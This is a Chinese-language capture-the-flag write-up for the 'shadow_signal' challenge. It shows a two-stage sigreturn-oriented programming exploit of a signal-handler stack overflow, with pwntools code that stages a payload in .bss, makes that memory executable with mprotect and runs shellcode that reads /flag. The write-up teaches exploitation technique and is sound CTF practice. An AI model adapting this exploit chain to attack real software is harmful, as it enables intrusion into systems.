# NepCTF2026 shadow_signal Writeup

## 题目简述

程序模拟了一套“影子栈”修复机制：普通栈溢出虽然能覆盖保存的返回地址，但函数返回前会把它恢复。可利用点位于 `SIGSEGV` 的信号处理函数 `handler`，其输入存在超长栈溢出。

由于信号返回最终会执行 `rt_sigreturn`，预期解法是两阶段 SROP：第一阶段把后续 payload 和 shellcode读入 `.bss`，第二阶段调用 `mprotect` 将该区域改为可执行，再跳到 ORW shellcode 读取 `/flag`。

## 解题过程

### 1. 主动进入信号处理函数

程序把用户给出的地址作为 `%s` 参数传给 `puts`。提供一个未映射地址即可触发 `SIGSEGV` 并进入 `handler`。调试时应让 GDB 把信号继续交给目标进程：

```gdb
handle SIGSEGV nostop noprint pass
break handler
continue
```

`handler` 中从输入起点到可控返回位置的偏移为 `0x118`。程序还会泄露 `_IO_2_1_stdout_`，可计算 libc 基址并搜索 `syscall; ret` 和触发 `rt_sigreturn` 的指令片段。

### 2. 第一阶段 SROP：读取新栈和 shellcode

第一份 `SigreturnFrame` 设置：

```text
rax = 0                 read
rdi = 0                 stdin
rsi = 0x407000          新栈
rdx = 0x500
rbp = 0x407008
rsp = 0x407008
rip = syscall_ret
```

payload 为：

```python
frame_off = 0x118
stage_addr = 0x407000
stage_size = 0x500

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = stage_addr
frame.rdx = stage_size
frame.rbp = stage_addr + 8
frame.rsp = stage_addr + 8
frame.rip = syscall_ret

payload = flat(
    b"A" * frame_off,
    rt_sigreturn,
    bytes(frame),
)
io.send(payload)
```

`rt_sigreturn` 恢复寄存器后执行 `read(0, 0x407000, 0x500)`，第二阶段数据落入 `.bss`。

### 3. 第二阶段 SROP：赋予执行权限

第二份帧执行：

```text
mprotect(0x407000, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
```

并把恢复后的栈顶布置为 shellcode 地址：

```python
sc_addr = stage_addr + 0x180

frame2 = SigreturnFrame()
frame2.rax = 10
frame2.rdi = stage_addr & ~0xFFF
frame2.rsi = 0x1000
frame2.rdx = 7
frame2.rip = syscall_ret

ret_off = 0x10 + len(bytes(frame2))
frame2.rsp = stage_addr + ret_off

shellcode = asm(shellcraft.open("/flag"))
shellcode += asm(shellcraft.read("rax", stage_addr + 0x300, 0x100))
shellcode += asm(shellcraft.write(1, stage_addr + 0x300, 0x100))
shellcode += asm(shellcraft.exit(0))

stage2 = flat(
    0,
    rt_sigreturn,
    bytes(frame2),
    sc_addr,
)
stage2 = stage2.ljust(sc_addr - stage_addr, b"\x90") + shellcode
io.send(stage2.ljust(stage_size, b"\x00"))
```

`mprotect` 返回后，从伪栈取出 `sc_addr`，经过 NOP 滑梯进入 ORW shellcode。

## 方法总结

模拟影子栈只修复常规函数返回地址，并没有覆盖信号上下文恢复这条控制流。遇到“返回地址会被改回去”的目标时，应检查异常、信号、长跳转和上下文恢复机制是否能绕开普通 epilogue。

SROP 的实质是让内核替攻击者恢复一整组寄存器。空间不足时可先用一帧完成大块读取和栈迁移，再用第二帧修改内存权限或完成 ORW；每一帧都应明确 syscall、`rsp` 和下一跳。
